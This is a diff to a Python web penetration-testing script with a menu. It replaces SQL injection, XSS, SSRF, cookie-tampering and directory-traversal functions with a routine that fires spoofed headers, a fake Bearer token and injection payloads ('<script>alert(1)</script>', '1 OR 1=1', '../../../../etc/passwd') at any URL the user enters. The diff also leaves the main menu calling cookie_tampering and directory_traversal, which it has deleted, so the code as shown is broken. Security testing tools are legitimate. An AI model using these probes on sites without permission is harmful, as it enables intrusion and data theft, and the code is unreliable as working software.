@@ -54,7 +54,6 @@ def print_banner():
     print(banner)
     
 
-
 # Function to log test results to a file
 def log_result(test_name, result, details=""):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -95,69 +94,39 @@ def log_result_html(test_name, result, details=""):
             </html>
             """)
 
-# Function for SQL Injection
-def sql_injection(url, form_data):
-    payloads = generate_payloads("sql_injection")
+# Function for Header and Parameter Manipulation Test
+def header_param_manipulation(url):
+    # Custom headers to manipulate
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Referer': 'http://example.com',
+        'X-Forwarded-For': '127.0.0.1',  # Localhost spoofing
+        'X-Request-ID': ''.join(random.choices(string.ascii_letters + string.digits, k=16)),  # Random ID
+        'Authorization': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32)),  # Fake token
+        'X-Injected-Header': 'InjectedHeaderValue'  # Custom header injection
+    }
+    
+    # Manipulating URL parameters
+    payloads = ["<script>alert(1)</script>", "1 OR 1=1", "../../../../etc/passwd", "admin'--", "'' OR 1=1 --"]
     for payload in payloads:
-        form_data["input_name"] = payload  # Replace with actual input name from form
-        response = requests.post(url, data=form_data)
-        result = "Success" if "error" in response.text else "Failed"
-        log_result("SQL Injection", result, f"Payload: {payload} - Status: {response.status_code}")
-        log_result_html("SQL Injection", result, f"Payload: {payload} - Status: {response.status_code}")
-
-# Function for XSS Test
-def xss_test(url, form_data):
-    payloads = generate_payloads("xss")
-    for payload in payloads:
-        form_data["input_name"] = payload  # Replace with actual input name from form
-        response = requests.post(url, data=form_data)
-        result = "Success" if "<script>" in response.text else "Failed"
-        log_result("XSS Test", result, f"Payload: {payload} - Status: {response.status_code}")
-        log_result_html("XSS Test", result, f"Payload: {payload} - Status: {response.status_code}")
-
-# Function to perform SSRF Test
-def ssrf_test(url):
-    payloads = generate_payloads("ssrf")
-    for payload in payloads:
-        response = requests.get(url, params={"url": payload})
-        result = "Success" if "localhost" in response.text else "Failed"
-        log_result("SSRF Test", result, f"Payload: {payload} - Status: {response.status_code}")
-        log_result_html("SSRF Test", result, f"Payload: {payload} - Status: {response.status_code}")
-
-# Function to manipulate headers
-def header_manipulation(url):
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
-    response = requests.get(url, headers=headers)
-    result = "Success" if response.status_code == 200 else "Failed"
-    log_result("Header Manipulation", result, f"Status: {response.status_code}")
-    log_result_html("Header Manipulation", result, f"Status: {response.status_code}")
-
-# Function to perform Cookie Tampering
-def cookie_tampering(url):
-    cookies = {"sessionid": "tampered_session_id"}
-    response = requests.get(url, cookies=cookies)
-    result = "Success" if "logged in" in response.text else "Failed"
-    log_result("Cookie Tampering", result, f"Status: {response.status_code}")
-    log_result_html("Cookie Tampering", result, f"Status: {response.status_code}")
-
-# Function to perform Directory Traversal Test
-def directory_traversal(url):
-    payloads = ["../../../../etc/passwd", "../../../../etc/shadow"]
-    for payload in payloads:
-        response = requests.get(url + payload)
-        result = "Success" if "root" in response.text else "Failed"
-        log_result("Directory Traversal", result, f"Payload: {payload} - Status: {response.status_code}")
-        log_result_html("Directory Traversal", result, f"Payload: {payload} - Status: {response.status_code}")
+        params = {"id": payload}  # Example of manipulating a parameter
+        
+        # Send GET request with manipulated headers
+        response = requests.get(url, headers=headers, params=params)
+        result = "Success" if response.status_code == 200 else "Failed"
+        log_result("Header and Parameter Manipulation", result, f"Payload: {payload} - Status: {response.status_code}")
+        log_result_html("Header and Parameter Manipulation", result, f"Payload: {payload} - Status: {response.status_code}")
+        print(f"[{result}] Parameter: {payload} - Status: {response.status_code}")
 
 # Function to print the main menu
 def print_main_menu():
     print("=" * 30)
-    print("Advanced Web Penetration Testing Framework")
+    print("Advanced Penetration Testing Framework")
     print("=" * 30)
-    print("[1] Crawl Website and Extract Forms      [2] Brute Force Test (Optional)")
+    print("[1] Crawl Website and Extract Forms       [2] Brute Force Test (Optional)")
     print("[3] SQL Injection Test                   [4] XSS Test")
     print("[5] SSRF Test                            [6] Cookie Tampering Test")
-    print("[7] Header Manipulation Test             [8] Directory Traversal Test")
+    print("[7] Header and Parameter Manipulation    [8] Directory Traversal Test")
     print("[9] CSRF Test                            [10] Advanced Recon (Exposed Files & Misconfigurations)")
     print("[11] Exit")
     print("=" * 30)
@@ -184,7 +153,7 @@ def main():
             elif choice == 2:
                 print("Brute Force Test (Optional) - Not yet implemented.")
             elif choice == 3:
-                sql_injection_sub_menu("http://example.com")  # Replace with the actual URL
+                sql_injection_sub_menu("http://example.com")  # Replace with actual URL
             elif choice == 4:
                 print("XSS Test - Not yet implemented.")
             elif choice == 5:
@@ -194,8 +163,8 @@ def main():
                 url = input("Enter the URL of the website for Cookie Tampering Test: ")
                 cookie_tampering(url)
             elif choice == 7:
-                url = input("Enter the URL of the website for Header Manipulation Test: ")
-                header_manipulation(url)
+                url = input("Enter the URL of the website for Header and Parameter Manipulation Test: ")
+                header_param_manipulation(url)
             elif choice == 8:
                 url = input("Enter the URL of the website for Directory Traversal Test: ")
                 directory_traversal(url)
